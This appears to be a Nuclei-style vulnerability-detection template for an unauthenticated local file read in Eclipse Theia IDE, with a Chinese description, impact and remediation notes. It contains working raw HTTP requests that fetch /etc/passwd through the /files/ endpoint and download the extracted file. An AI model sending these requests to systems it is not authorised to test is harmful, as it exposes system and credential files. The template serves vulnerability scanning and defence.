id: theia-lfi-to-rce

info:
  name: Eclipse Theia IDE - 本地文件包含 to 远程代码执行
  author: 0x_Akoko
  severity: critical
  description: |
    该模板用于检测 Eclipse Theia IDE - 本地文件包含 to 远程代码执行。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/files/?uri=file:///etc/passwd`、`/files/download/?id={{file_id}}` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://theia-ide.org/
  metadata:
    verified: true
    max-request: 2
  tags: theia,ide,lfi,lfr,unauth,rce

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /files/?uri=file:///etc/passwd HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /files/download/?id={{file_id}} HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: json
        name: file_id
        part: body
        internal: true
        json:
          - '.id'

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
